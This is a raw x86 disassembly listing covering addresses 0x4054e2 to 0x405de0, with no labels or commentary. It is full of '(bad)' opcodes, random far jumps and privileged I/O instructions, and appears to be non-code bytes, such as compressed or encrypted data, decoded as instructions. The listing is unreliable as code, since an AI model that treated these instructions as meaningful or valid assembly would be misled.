  4054e2:	mov    dh,0xc0
  4054e4:	nop
  4054e5:	test   DWORD PTR [ebx],edi
  4054e7:	rcr    DWORD PTR [esi+0x43739ff],0x1
  4054ee:	jmp    0x58a40253
  4054f3:	pop    edi
  4054f4:	add    eax,0xaac9
	...
  405505:	add    BYTE PTR [edx],ch
  405507:	mov    ch,ah
  405509:	push   0x42
  40550b:	or     eax,0x8261f500
  405510:	jge    0x4054eb
  405512:	pusha  
  405513:	sbb    DWORD PTR [ecx],ebx
  405515:	outs   dx,BYTE PTR ds:[esi]
  405516:	push   0xfffffff9
  405518:	(bad)  
  405519:	fcomp  QWORD PTR [eax-0x53]
  40551c:	fiadd  DWORD PTR [ebx+0x0]
  40551f:	sahf   
  405520:	(bad)  
  405521:	fdiv   QWORD PTR [eax]
  405523:	lahf   
  405524:	jne    0x405503
  405526:	add    DWORD PTR [eax],ebx
  405528:	or     BYTE PTR [ecx+0x5d],dl
  40552b:	mov    edx,0xc32e3eff
  405530:	adc    cl,ch
  405532:	pop    ebx
  405533:	mov    ch,ah
  405535:	push   0x42
  405537:	or     eax,0x83049d00
  40553c:	jge    0x40552b
  40553e:	pusha  
  40553f:	sbb    DWORD PTR [esi],edx
  405541:	push   ss
  405542:	pop    edx
  405543:	cmc    
  405544:	(bad)  
  405545:	xchg   esp,eax
  405546:	pop    eax
  405547:	lods   eax,DWORD PTR ds:[esi]
  405548:	scas   al,BYTE PTR es:[edi]
  405549:	add    BYTE PTR [eax+0x62],al
  40554c:	(bad)  
  40554d:	call   DWORD PTR [edi+0xe]
  405550:	push   DWORD PTR [ebp-0x3e]
  405553:	imul   eax,DWORD PTR ds:0xc962bddb,0x5501cec2
  40555d:	mov    ebp,DWORD PTR [esi-0x720f3b7a]
  405563:	cld    
  405564:	or     ebp,eax
  405566:	jge    0x4055ce
  405568:	(bad)  
  405569:	inc    DWORD PTR [eax]
	...
  405577:	add    BYTE PTR [eax],al
  405579:	xor    ecx,DWORD PTR [ebp+0xc]
  40557c:	sbb    DWORD PTR [edi-0xb],0xffffffff
  405580:	jae    0x4055f6
  405582:	bound  esi,QWORD PTR [ebp+0xc]
  405585:	mov    ds:0xbdffe2ce,al
  40558a:	push   cs
  40558b:	shl    BYTE PTR [eax+ecx*2+0x74],0x45
  405590:	lock cmp ah,BYTE PTR [edx+0x75]
  405594:	or     al,0xe2
  405596:	xchg   ebx,esp
  405598:	(bad)  
  405599:	fisttp QWORD PTR [esi]
  40559b:	shl    BYTE PTR [eax+ebx*1-0x7e],0x7d
  4055a0:	cld    
  4055a1:	dec    edx
  4055a2:	or     DWORD PTR [eax],edx
  4055a4:	add    BYTE PTR [ecx-0x57],cl
  4055a7:	(bad)  
  4055a8:	jne    0x405568
  4055aa:	addr16 jne 0x4055a5
  4055ad:	xchg   edx,eax
  4055ae:	popf   
  4055af:	out    0xff,al
  4055b1:	lea    ecx,[ebx]
  4055b3:	shl    BYTE PTR [ebp+0x2b],0x68
  4055b7:	jne    0x4055c9
  4055b9:	popf   
  4055ba:	std    
  4055bb:	sti    
  4055bc:	call   edi
  4055be:	cmp    bh,0x75
  4055c1:	add    dh,BYTE PTR [ecx+0x4f]
  4055c4:	(bad)  
  4055c5:	cmp    eax,0x6a458d67
  4055ca:	fsub   st,st(7)
  4055cc:	loopne 0x405637
  4055ce:	addr16 (bad) 
  4055d0:	jmp    DWORD PTR [ebx+0x79]
  4055d3:	psubsb mm7,QWORD PTR [edx+0x1affa1e9]
  4055da:	icebp  
  4055db:	push   cs
	...
  4055ec:	ss pop ss
  4055ee:	scas   eax,DWORD PTR es:[edi]
  4055ef:	sbb    DWORD PTR [edi+0x5f75a19e],0x6
  4055f6:	mov    cl,0xe2
  4055f8:	les    esp,FWORD PTR [ebx+0x2f6f458b]
  4055fe:	pop    ds
  4055ff:	or     al,0x63
  405601:	cmp    cl,BYTE PTR [ecx-0x1]
  405604:	ss mov edx,0xc3c15aab
  40560a:	mov    eax,ds:0xd4d2a30b
  40560f:	mov    WORD PTR [esi],ds
  405611:	pop    esi
  405612:	xor    al,0xff
  405614:	push   ss
  405615:	mov    edx,0x638011ab
  40561a:	mov    eax,ds:0xe4f2a30b
  40561f:	xor    dh,0x71
  405622:	add    al,0x0
  405624:	push   ebx
  405625:	scas   al,BYTE PTR es:[edi]
  405626:	adc    al,0x11
  405628:	fs cdq 
  40562a:	repz (bad) 
  40562c:	(bad)  
  40562d:	sbb    ah,BYTE PTR [ecx+0x17135b75]
  405633:	or     BYTE PTR [ebx],bh
  405635:	sbb    DWORD PTR [edx+0x471144ff],esp
  40563b:	lock xchg ebx,eax
  40563d:	ss and ah,bl
  405640:	xor    al,0x33
  405642:	mov    eax,ds:0x49465f75
  405647:	frstor [ebx+eax*2]
  40564a:	retf   
  40564b:	ret    0xae6f
  40564e:	mov    eax,DWORD PTR ss:[eax]
	...
  40565d:	add    BYTE PTR [eax],al
  40565f:	pop    es
  405660:	das    
  405661:	enter  0xb0f0,0x7
  405665:	mov    ebp,0xf1058eff
  40566a:	stos   DWORD PTR es:[edi],eax
  40566b:	jmp    0xe141:0xeaa11ea6
  405672:	test   BYTE PTR [esi+0xd],ch
  405675:	jmp    0x7cdcf391
  40567a:	or     ecx,ebx
  40567c:	xchg   ecx,eax
  40567d:	or     BYTE PTR [ecx+0x18290fd4],ah
  405683:	xchg   ecx,eax
  405684:	mov    ah,BYTE PTR [ebx+edx*4+0xc5c9c33]
  40568b:	retf   
  40568c:	push   0xfb4a0cb
  405691:	test   eax,0x4c868117
  405696:	mov    al,ds:0x3d90563
  40569b:	adc    ch,dh
  40569d:	mov    ebp,0x3c9b9716
  4056a2:	pushf  
  4056a3:	jnp    0x405680
  4056a5:	(bad)  
  4056a6:	mov    al,ds:0x17a90f84
  4056ab:	bound  ecx,QWORD PTR [eax+0x6c]
  4056ae:	inc    esi
  4056af:	jae    0x4056e5
  4056b1:	cmp    ebp,0xa08e9b81
  4056b7:	out    dx,al
  4056b8:	or     al,0x91
  4056ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bb:	aas    
  4056bc:	fwait
  4056bd:	jle    0x40564b
  4056bf:	and    BYTE PTR [edi],bh
  4056c1:	mov    al,ds:0xc5
	...
  4056d2:	addr16 add eax,0x85378d14
  4056d8:	sub    eax,0x5e9b3d57
  4056dd:	enter  0x5dde,0x57
  4056e1:	mov    al,ds:0x3e9062c
  4056e6:	arpl   WORD PTR [esi-0x3a97f054],cx
  4056ec:	mov    ch,0x6
  4056ee:	jecxz  0x4056cd
  4056f0:	(bad)  
  4056f1:	call   0xb229576b
  4056f6:	popa   
  4056f7:	add    eax,0x9552600
  4056fc:	call   0xffdb2249
  405701:	loop   0x405723
  405703:	adc    DWORD PTR [edi],ecx
  405705:	or     DWORD PTR [ebx+0x3e940e9],0xc2110c11
  40570f:	mov    edx,0x8f8f6ff
  405714:	push   0x45b42d
  405719:	out    0x5a,al
  40571b:	or     eax,ebp
  40571d:	push   cs
  40571e:	call   FWORD PTR [edx+0x5dda60ff]
  405724:	dec    dh
  405726:	les    ebp,FWORD PTR ds:0x560e83e
  40572c:	lea    esp,[ecx+eiz*4-0x65]
  405730:	push   DWORD PTR [esi-0x725852a9]
	...
  405742:	add    BYTE PTR [eax],al
  405744:	add    ah,ah
  405746:	call   0x9eff:0x9ba16c8d
  40574d:	das    
  40574e:	call   0x81ff:0x9acd51b5
  405755:	shr    BYTE PTR [eax+0x0],0xe9
  405759:	out    dx,eax
  40575a:	jg     0x405718
  40575c:	jg     0x405752
  40575e:	cdq    
  40575f:	inc    eax
  405760:	out    0xe4,al
  405762:	inc    BYTE PTR [eax]
  405764:	jmp    0x2bd5dfc9
  405769:	fstp   QWORD PTR [ecx-0xa9ea901]
  40576f:	(bad)  
  405770:	call   0x6ac461d5
  405775:	pop    edi
  405776:	add    eax,0x47970000
  40577b:	sub    al,0x50
  40577d:	xor    dh,BYTE PTR [esp+ebp*1]
  405780:	inc    ecx
  405781:	cli    
  405782:	ins    DWORD PTR es:[edi],dx
  405783:	mov    esp,0xb05faad
  405788:	rcr    bh,0xc
  40578b:	jmp    0x46625c
  405790:	lea    ebp,[edi-0x39]
  405793:	(bad)  
  405794:	call   DWORD PTR [ebp+0x74]
  405797:	inc    edx
  405798:	sub    al,0xfa
  40579a:	in     eax,dx
  40579b:	mov    bl,0x2c
  40579d:	or     eax,DWORD PTR [esi]
  40579f:	call   0x417f43
  4057a4:	or     edi,DWORD PTR [edx-0x4]
  4057a7:	add    al,0xe9
	...
  4057b5:	add    BYTE PTR [eax],al
  4057b7:	add    ch,dl
  4057b9:	add    eax,0xfc950000
  4057be:	or     ebp,eax
  4057c0:	xchg   edi,eax
  4057c1:	pop    edi
  4057c2:	(bad)  
  4057c3:	inc    ecx
  4057c5:	lds    esi,FWORD PTR [ebp+0xf]
  4057c8:	xor    al,bl
  4057ca:	sub    BYTE PTR [ecx-0x76],al
  4057cd:	jp     0x405844
  4057cf:	or     al,0xa2
  4057d1:	sbb    ebx,edi
  4057d3:	push   DWORD PTR [ebp-0x7595f592]
  4057d9:	jp     0x405850
  4057db:	or     al,0xd2
  4057dd:	xchg   edi,ebx
  4057df:	call   ebp
  4057e1:	je     0x405778
  4057e3:	ret    0x7ad4
  4057e6:	dec    DWORD PTR [ebp+0x50519578]
  4057ec:	repnz push esi
  4057ee:	(bad)  
  4057f0:	aad    0xd4
  4057f2:	(bad)  
  4057f3:	jne    0x405827
  4057f5:	js     0x40586c
  4057f7:	adc    al,0xc5
  4057f9:	std    
  4057fa:	(bad)  
  4057fc:	xchg   ebp,eax
  4057fd:	std    
  4057fe:	pop    es
  4057ff:	call   0xffdd9667
  405804:	and    al,0x47
  405806:	(bad)  
  405807:	fistp  DWORD PTR [eax+eax*2]
  40580a:	stos   BYTE PTR es:[edi],al
  40580b:	pusha  
  40580c:	out    0x6c,al
  40580e:	out    dx,eax
  40580f:	mov    dh,ah
  405811:	sbb    bl,BYTE PTR [ebp+0x202c04ff]
  405817:	adc    BYTE PTR [ebx+0x79],ah
  40581a:	add    ebx,ebp
	...
  405828:	add    BYTE PTR [eax],al
  40582a:	add    BYTE PTR [ecx-0x9],dl
  40582d:	pop    ss
  40582e:	adc    ah,ch
  405830:	cmp    DWORD PTR [edi-0x2],edx
  405833:	in     al,0x7
  405835:	stos   DWORD PTR es:[edi],eax
  405836:	inc    edx
  405837:	or     eax,0xa30b03af
  40583c:	adc    ah,al
  40583e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  405840:	mov    BYTE PTR [eax+eax*1-0x3c],0x11
  405845:	psubsb mm6,QWORD PTR [edi-0x41]
  405849:	popf   
  40584a:	push   DWORD PTR [ecx+esi*2-0x505301a8]
  405851:	xor    al,0xe8
  405853:	daa    
  405854:	addr16 popf 
  405856:	push   DWORD PTR [ebx]
  405858:	sub    ebx,DWORD PTR [edi]
  40585a:	sbb    BYTE PTR [ebx-0x2e],ah
  40585d:	ud0    edx,DWORD PTR [esi]
  405860:	mov    edx,0xa60eff33
  405865:	pushf  
  405866:	push   ebp
  405867:	pop    ebx
  405868:	jae    0x40587a
  40586a:	(bad)  
  40586b:	out    dx,al
  40586c:	xchg   ecx,eax
  40586d:	xor    edi,edi
  40586f:	mul    BYTE PTR [ebp-0x7899ab55]
  405875:	popf   
  405876:	call   0xffddbc41
  40587b:	out    0x20,al
  40587d:	ret    0x4cfe
  405880:	sysenter 
  405882:	dec    DWORD PTR [esi]
  405884:	jmp    0xb951:0x53cff9d
  40588b:	pop    es
  40588c:	add    eax,0x86e9
	...
  40589d:	add    BYTE PTR [ebx],ah
  40589f:	or     BYTE PTR [ebx+edx*4+0x25],ch
  4058a3:	cwde   
  4058a4:	dec    esi
  4058a5:	popf   
  4058a6:	(bad)  
  4058a7:	pop    eax
  4058a8:	inc    edi
  4058a9:	popf   
  4058aa:	adc    al,0xad
  4058ac:	das    
  4058ad:	jo     0x405912
  4058af:	add    eax,0x96cb5736
  4058b4:	cs popf 
  4058b6:	or     edx,edx
  4058b8:	inc    ecx
  4058b9:	popf   
  4058ba:	hlt    
  4058bb:	int    0x2b
  4058bd:	clc    
  4058be:	in     al,dx
  4058bf:	xor    BYTE PTR [edx-0x50],ah
  4058c2:	jns    0x4058c9
  4058c4:	push   cs
  4058c5:	pop    ss
  4058c6:	ja     0x405860
  4058c8:	jl     0x4058bd
  4058ca:	aad    0x11
  4058cc:	in     eax,dx
  4058cd:	pushf  
  4058ce:	push   esi
  4058cf:	or     eax,0x97c6dd01
  4058d4:	out    dx,al
  4058d5:	retf   0xf4a1
  4058d8:	call   0xdee94113
  4058dd:	push   ss
  4058de:	pop    edi
  4058df:	lods   eax,DWORD PTR ds:[esi]
  4058e0:	xor    bh,BYTE PTR [ebp-0x3c1d685c]
  4058e6:	pop    ss
  4058e7:	test   ebp,0xd1357316
  4058ed:	xchg   ecx,eax
  4058ee:	lods   eax,DWORD PTR ds:[esi]
  4058ef:	xchg   edi,eax
  4058f0:	mov    dh,0x33
  4058f2:	test   BYTE PTR [ecx],dl
  4058f4:	rcr    DWORD PTR [esi+esi*8-0x1162c710],1
  4058fb:	or     al,0x91
  4058fd:	pop    ebp
  4058fe:	ins    BYTE PTR es:[edi],dx
  4058ff:	xchg   edi,eax
  405900:	xchg   esi,eax
  405901:	stos   DWORD PTR es:[edi],eax
	...
  40590e:	add    BYTE PTR [eax],al
  405910:	add    BYTE PTR [ecx-0x46],bh
  405913:	mov    ds,WORD PTR [edx+ebp*1-0x51fc223c]
  40591a:	mov    cl,BYTE PTR [ebp-0xe2964]
  405920:	jne    0x40598f
  405922:	cmc    
  405923:	(bad)  
  405924:	hlt    
  405925:	ins    BYTE PTR es:[edi],dx
  405926:	sub    ebx,DWORD PTR [edx]
  405928:	dec    bp
  40592a:	or     eax,0x96cfa0e8
  40592f:	call   DWORD PTR [esi+0x4d]
  405932:	icebp  
  405933:	(bad)  
  405934:	aam    0x10
  405936:	cwde   
  405937:	jne    0x40592e
  405939:	dec    edx
  40593a:	loop   0x40593a
  40593c:	mov    ah,0x58
  40593e:	lods   eax,DWORD PTR ds:[esi]
  40593f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405940:	ss out 0x96,eax
  405943:	push   DWORD PTR [esp+esi*8-0x28068a69]
  40594a:	adc    BYTE PTR [ebx+edx*4],cl
  40594d:	in     al,dx
  40594e:	xchg   edi,eax
  40594f:	jne    0x405932
  405951:	mov    eax,0xff0eff72
  405956:	int3   
  405957:	ret    0x60d9
  40595a:	xor    BYTE PTR [ebx-0xf3e1cf3],cl
  405960:	call   0x40eb:0x122b2e8e
  405967:	or     al,0xe6
  405969:	pop    DWORD PTR [edi+0x10c8e145]
  40596f:	or     BYTE PTR [esi+0x22],ah
  405972:	cdq    
  405973:	(bad)  
  405974:	and    al,0x0
	...
  405982:	add    BYTE PTR [eax],al
  405984:	repz add eax,0x8260e900
  40598a:	cmp    eax,0x457ff6
  40598f:	jmp    0x2cc392e8
  405994:	outs   dx,DWORD PTR ds:[esi]
  405995:	add    eax,0x40ea3f74
  40599a:	lock cmp DWORD PTR ds:0x36e96a04,edi
  4059a1:	add    eax,0x96570c83
  4059a6:	jae    0x4059a8
  4059a8:	inc    edi
  4059a9:	jnp    0x405a20
  4059ab:	adc    cl,dh
  4059ad:	(bad)  
  4059ae:	imul   eax,DWORD PTR [eax],0x458d0160
  4059b4:	mov    dl,0xd1
  4059b6:	(bad)  
  4059b7:	adc    eax,0x40a855
  4059bc:	xor    edx,eax
  4059be:	je     0x4059ef
  4059c0:	mov    ecx,0x3600f3fc
  4059c5:	test   eax,0x870e458a
  4059ca:	dec    ebp
  4059cb:	lock popa 
  4059cd:	or     DWORD PTR [edi+0x17],esi
  4059d0:	mov    ecx,0x36758b6d
  4059d5:	xchg   BYTE PTR [ebp+0x8],bh
  4059d8:	jno    0x405a26
  4059da:	lock jecxz 0x4059d5
  4059dd:	outs   dx,BYTE PTR ds:[esi]
  4059de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059df:	mov    esi,DWORD PTR [edi+0x7a75fefd]
  4059e5:	mov    al,BYTE PTR [eax]
  4059e7:	inc    DWORD PTR [eax]
	...
  4059f5:	add    BYTE PTR [eax],al
  4059f7:	push   edi
  4059f8:	xchg   al,ch
  4059fa:	aaa    
  4059fb:	xor    DWORD PTR [ecx],eax
  4059fd:	add    BYTE PTR [ebx+0x5b5dda79],cl
  405a03:	cmp    DWORD PTR [edi-0x7988fff4],0xffffffec
  405a0a:	add    DWORD PTR [esi],0x6e
  405a0d:	push   ebx
  405a0e:	push   esi
  405a0f:	gs jmp 0x18b896b
  405a15:	call   0x424bb3
  405a1a:	mov    eax,edx
  405a1c:	ret    0xfc45
  405a1f:	jp     0x405a22
  405a21:	add    BYTE PTR [eax],al
  405a23:	add    ecx,0x3e523e74
  405a29:	das    
  405a2a:	inc    ecx
  405a2b:	jp     0x4059fb
  405a2d:	out    0x45,eax
  405a2f:	arpl   WORD PTR [ebx+0x3],ax
  405a32:	add    BYTE PTR [eax+0x5e],ch
  405a35:	comiss xmm5,xmm0
  405a38:	push   cs
  405a39:	sub    esp,DWORD PTR [esp+edi*2-0x23]
  405a3d:	add    edx,DWORD PTR [ebx+0x3b]
  405a40:	push   ebx
  405a41:	outs   dx,BYTE PTR ds:[esi]
  405a42:	add    BYTE PTR [ebx-0x59],ah
  405a45:	ret    
  405a46:	je     0x405a9d
  405a48:	pop    ss
  405a49:	fwait
  405a4a:	lea    esp,[esi+0x66e83332]
  405a50:	xchg   DWORD PTR [ebx],eax
  405a52:	add    BYTE PTR [ebx-0x697c4dbd],dh
  405a58:	dec    edx
  405a59:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  405a69:	add    BYTE PTR [ecx-0x7a],bl
  405a6c:	add    al,0x0
  405a6e:	arpl   WORD PTR [esi-0x1a67a1c6],bx
  405a74:	lds    edi,FWORD PTR [eax+0x39e63]
  405a7a:	mov    WORD PTR [esi+edi*1-0x37],ss
  405a7e:	and    BYTE PTR [edx-0x72],dl
  405a81:	in     al,dx
  405a82:	loopne 0x405a6e
  405a84:	xchg   edx,eax
  405a85:	adc    DWORD PTR [esi+0x6340e8d3],0xffffff9e
  405a8c:	movhlps xmm4,xmm0
  405a8f:	pop    ecx
  405a90:	pop    esi
  405a91:	and    bl,BYTE PTR cs:[esi+0x1f6a7403]
  405a98:	xlat   BYTE PTR ds:[ebx]
  405a99:	mov    esi,0x3dd7d
  405a9e:	mov    cs:0x9e63015b,eax
  405aa4:	add    ecx,ecx
  405aa6:	mov    al,ds:0xa5fa3f19
  405aab:	sahf   
  405aac:	add    eax,esi
  405aae:	and    ebx,DWORD PTR [ebp-0x5fdc39fd]
  405ab4:	add    eax,esi
  405ab6:	and    eax,DWORD PTR ds:0x45a503ea
  405abc:	in     eax,0x3
  405abe:	popf   
  405abf:	inc    ebp
  405ac0:	in     al,dx
  405ac1:	(bad)  
  405ac2:	out    dx,eax
  405ac3:	dec    ecx
  405ac4:	xchg   ebp,eax
  405ac5:	xor    al,0xc9
  405ac7:	add    eax,0x5b90413
  405acc:	adc    eax,DWORD PTR [eax+eax*1]
	...
  405adb:	add    BYTE PTR [eax],al
  405add:	mov    ecx,0xcb040305
  405ae2:	in     eax,0xea
  405ae4:	add    esp,DWORD PTR [ebx+0x1f]
  405ae7:	or     DWORD PTR [esi],ebp
  405ae9:	popa   
  405aea:	and    BYTE PTR [ebp+ebx*4+0x50fc9493],0x4d
  405af2:	inc    esi
  405af3:	jmp    0xeb5a7e04
  405af8:	retf   0xcc20
  405afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405afc:	xchg   ebx,eax
  405afd:	arpl   WORD PTR ds:0x49ee03e9,ax
  405b03:	cmp    DWORD PTR [esp+esi*8],esi
  405b06:	sbb    DWORD PTR ds:0xf494632e,ebx
  405b0c:	pop    esp
  405b0d:	xor    eax,0xa30ce946
  405b12:	sbb    esi,esp
  405b14:	rcr    BYTE PTR [esi],0x95
  405b17:	jmp    0xfe45be1f
  405b1c:	push   cs
  405b1d:	iret   
  405b1e:	xchg   ebx,eax
  405b1f:	fcomp  QWORD PTR [eax-0x73]
  405b22:	inc    esi
  405b23:	jmp    0xb0d579b4
  405b28:	les    edx,FWORD PTR [esi]
  405b2a:	or     ch,0x84
  405b2d:	lahf   
  405b2e:	jl     0x405b94
  405b30:	ds jmp 0x405b67
  405b33:	inc    ecx
  405b34:	or     eax,0xabe94644
  405b39:	and    ch,BYTE PTR [ebx+0x3398be]
  405b3f:	add    BYTE PTR [ecx+0x0],ch
	...
  405b4d:	add    BYTE PTR [eax],al
  405b4f:	add    BYTE PTR [ebx+ecx*1-0x7d],ch
  405b53:	sub    al,0xe7
  405b55:	clc    
  405b56:	jbe    0x405b6a
  405b58:	in     al,0x49
  405b5a:	lock cmp DWORD PTR [edi+0x60e9aaf2],esi
  405b61:	mov    al,al
  405b63:	adc    DWORD PTR [ecx-0x15d349fe],ebx
  405b69:	xor    eax,0x9385370f
  405b6e:	push   eax
  405b6f:	out    0x92,al
  405b71:	dec    eax
  405b72:	std    
  405b73:	sbb    DWORD PTR [edx+0x5b],ebp
  405b76:	inc    ebp
  405b77:	gs jo  0x405b7c
  405b7a:	mov    dh,0xa4
  405b7c:	(bad)  
  405b7d:	xor    eax,0x8f5d9f0f
  405b82:	push   eax
  405b83:	fidiv  WORD PTR [edx+0x5b99f948]
  405b89:	pop    ebx
  405b8a:	inc    ebp
  405b8b:	inc    ecx
  405b8c:	push   eax
  405b8d:	add    dh,BYTE PTR [edi+0xf35d2ac]
  405b93:	jbe    0x405bca
  405b95:	cdq    
  405b96:	push   eax
  405b97:	es pop ebp
  405b99:	xchg   ebp,eax
  405b9a:	push   0x45fbf9
  405b9f:	fs popf 
  405ba1:	adc    DWORD PTR [eax+0x1],0xe900600b
  405ba8:	out    0xc9,eax
  405baa:	xor    al,0x6c
  405bac:	test   DWORD PTR [ecx+0x5c3b0150],eax
  405bb2:	add    cl,ch
	...
  405bc0:	add    BYTE PTR [eax],al
  405bc2:	add    BYTE PTR [eax-0x80],dh
  405bc5:	inc    ebp
  405bc6:	jne    0x405c3f
  405bc8:	sbb    eax,0x51e0e0b
  405bcd:	call   0xffd31f6a
  405bd2:	rcl    DWORD PTR [ebp*4-0x3f5aff01],0xc3
  405bda:	push   ebp
  405bdb:	adc    DWORD PTR [ebp-0x7f],ebx
  405bde:	les    esp,FWORD PTR [esi+0x7a]
  405be1:	(bad)  
  405be2:	call   FWORD PTR [ecx-0x1e]
  405be5:	imul   eax,DWORD PTR [eax],0x75ff0950
  405beb:	jb     0x405c4b
  405bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bee:	aad    0xf5
  405bf0:	jns    0x405b7b
  405bf2:	inc    ebp
  405bf3:	out    0xe0,al
  405bf5:	add    BYTE PTR [eax],al
  405bf7:	cmc    
  405bf8:	cmp    bh,bh
  405bfa:	jne    0x405c4e
  405bfc:	pop    esi
  405bfd:	out    0xd4,eax
  405bff:	mov    ch,0x7a
  405c01:	push   0x64a9c
  405c06:	lea    edi,[edi-0x7a000117]
  405c0c:	(bad)  
  405c0e:	jnp    0x405c62
  405c10:	jp     0x405c11
  405c12:	(bad)  
  405c13:	jg     0x405bfe
  405c15:	(bad)  
  405c16:	jmp    DWORD PTR [ebp-0x5fffff3]
  405c1c:	jl     0x405ba3
  405c1e:	pusha  
  405c1f:	xor    eax,0xa250ff7a
  405c24:	pop    eax
  405c25:	test   eax,0x0
	...
  405c36:	cli    
  405c37:	sahf   
  405c38:	enter  0x282b,0x7c
  405c3c:	mov    ebp,0xff7a7574
  405c41:	jmp    0x405c1c
  405c43:	test   DWORD PTR [edi],edi
  405c45:	add    BYTE PTR [edi+0x5],cl
  405c48:	mov    edx,0x5ba01
  405c4d:	or     ebx,DWORD PTR [eax-0xb]
  405c50:	add    al,dh
  405c52:	mov    ebp,0x3b414705
  405c57:	jno    0x405bd9
  405c59:	add    BYTE PTR [edx+0x63e57205],bh
  405c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c60:	ret    
  405c61:	je     0x405cd0
  405c63:	inc    esp
  405c64:	js     0x405c66
  405c66:	arpl   WORD PTR [eax+ecx*4-0x69acfc7b],bx
  405c6d:	call   DWORD PTR [ebx]
  405c6f:	pop    ebx
  405c70:	adc    BYTE PTR [eax],cl
  405c72:	mov    ebx,DWORD PTR [edx]
  405c74:	scas   eax,DWORD PTR es:[edi]
  405c75:	jmp    FWORD PTR [esi+esi*2+0x7]
  405c79:	push   0x63
  405c7b:	test   BYTE PTR [ebx],0xff
  405c7e:	(bad)  
  405c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c80:	stos   DWORD PTR es:[edi],eax
  405c81:	test   eax,0xe896802f
  405c86:	push   ds
  405c87:	mov    dl,BYTE PTR [esi+0x100fb3ff]
  405c8d:	or     BYTE PTR [ebx+0x2],cl
  405c90:	mov    al,0xff
  405c92:	xor    al,0x7
  405c94:	add    al,0x4
  405c96:	arpl   WORD PTR [esi+0xe9ab],bx
	...
  405ca8:	add    BYTE PTR [eax+esi*1],cl
  405cab:	xchg   esi,eax
  405cac:	mov    esi,esp
  405cae:	pop    edx
  405caf:	xchg   esi,eax
  405cb0:	call   DWORD PTR [edi+eax*8]
  405cb3:	xchg   esi,eax
  405cb4:	add    esp,DWORD PTR [ebx-0x62]
  405cb7:	xchg   esi,eax
  405cb8:	mov    ch,0xa7
  405cba:	iret   
  405cbb:	xchg   ebp,eax
  405cbc:	dec    DWORD PTR [ebx-0xb000c64]
  405cc2:	mov    BYTE PTR [ebx],0x4
  405cc5:	arpl   WORD PTR [esi-0x6145ad55],bx
  405ccb:	add    edx,DWORD PTR [eax-0x24]
  405cce:	xor    DWORD PTR [edi],esi
  405cd0:	call   esp
  405cd2:	call   DWORD PTR [ebp+0x20f65b75]
  405cd8:	aam    0xc4
  405cda:	(bad)  
  405cde:	sahf   
  405cdf:	add    edi,edi
  405ce1:	out    dx,al
  405ce2:	adc    BYTE PTR [esi+0x5105acff],0x3
  405ce9:	push   ebx
  405cea:	add    eax,0x9632be9
  405cef:	jmp    0x801ee7f7
  405cf4:	add    al,0x63
  405cf6:	xor    eax,0x90274fc6
  405cfb:	mov    esi,0xe11a7c95
  405d00:	stos   DWORD PTR es:[edi],eax
  405d01:	cmp    bh,BYTE PTR [ecx-0x35846a52]
  405d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d08:	xchg   ebp,eax
  405d09:	fs xor eax,0xf9e
	...
  405d1b:	add    BYTE PTR [ebx-0x63],ch
  405d1e:	pushf  
  405d1f:	mov    cl,0x54
  405d21:	nop
  405d22:	xor    DWORD PTR [ebx],0x8786904d
  405d28:	fisubr WORD PTR [esi+edi*2]
  405d2b:	xchg   ebp,eax
  405d2c:	cmp    al,0x35
  405d2e:	add    DWORD PTR [ecx],ecx
  405d30:	test   BYTE PTR [esi-0x17],al
  405d33:	stos   DWORD PTR es:[edi],eax
  405d34:	(bad)  
  405d35:	test   al,0x66
  405d37:	xchg   ebp,eax
  405d38:	fimul  DWORD PTR [ecx-0x6fe36b4b]
  405d3e:	push   0x57
  405d40:	scas   eax,DWORD PTR es:[edi]
  405d41:	nop
  405d42:	dec    esi
  405d43:	xchg   ebp,eax
  405d44:	arpl   WORD PTR [ecx],bx
  405d46:	lods   al,BYTE PTR ds:[esi]
  405d47:	add    dh,0x2c
  405d4a:	ds xchg ebp,eax
  405d4c:	cld    
  405d4d:	clc    
  405d4e:	mov    edx,0x9189e1d7
  405d53:	xchg   esp,eax
  405d54:	in     al,dx
  405d55:	(bad)  
  405d56:	in     eax,dx
  405d57:	xchg   esp,eax
  405d58:	scas   al,BYTE PTR es:[edi]
  405d59:	sub    al,0x1e
  405d5b:	xchg   ebp,eax
  405d5c:	fmul   QWORD PTR [edi+0x52cb0b9c]
  405d62:	cmp    dl,BYTE PTR [ebp+0x3c5483cc]
  405d68:	les    ecx,FWORD PTR [edi-0x6fb50002]
  405d6e:	add    dh,dh
  405d70:	gs std 
  405d72:	out    0x48,eax
  405d74:	repnz (bad) 
  405d76:	jmp    esi
  405d78:	adc    eax,0xf7deff2d
  405d7d:	(bad)  
  405d7e:	mov    ch,0x3d
	...
  405d8c:	add    BYTE PTR [eax],al
  405d8e:	add    dh,ch
  405d90:	(bad)  
  405d91:	dec    esi
  405d93:	pop    ebp
  405d94:	std    
  405d95:	out    0x8b,eax
  405d97:	ror    DWORD PTR [edi+0x1b64d2ff],cl
  405d9d:	add    BYTE PTR [ebx+0x5f],al
  405da0:	nop
  405da1:	jne    0x405d84
  405da3:	mov    eax,0xcfa6d359
  405da8:	(bad)  
  405da9:	mov    ch,0x35
  405dab:	test   BYTE PTR [esi-0x47f47e01],0xff
  405db2:	mov    ?,edi
  405db4:	pop    eax
  405db5:	pop    esp
  405db6:	xchg   bh,ch
  405db8:	mov    gs,eax
  405dba:	mov    DWORD PTR [esi],ecx
  405dbc:	(bad)  
  405dbd:	inc    edx
  405dbf:	sti    
  405dc0:	sbb    eax,0x5a1be57
  405dc5:	call   0x46169b
  405dca:	jo     0x405d69
  405dcc:	loope  0x405dcc
  405dce:	push   esi
  405dcf:	out    dx,eax
  405dd0:	cmp    BYTE PTR [ebp-0x710803],0xe9
  405dd7:	push   esp
  405dd8:	out    dx,eax
  405dd9:	stos   BYTE PTR es:[di],al
  405ddb:	pop    es
  405ddc:	inc    esi
  405ddd:	add    BYTE PTR [esi],dh
  405ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de0:	loope  0x405de0
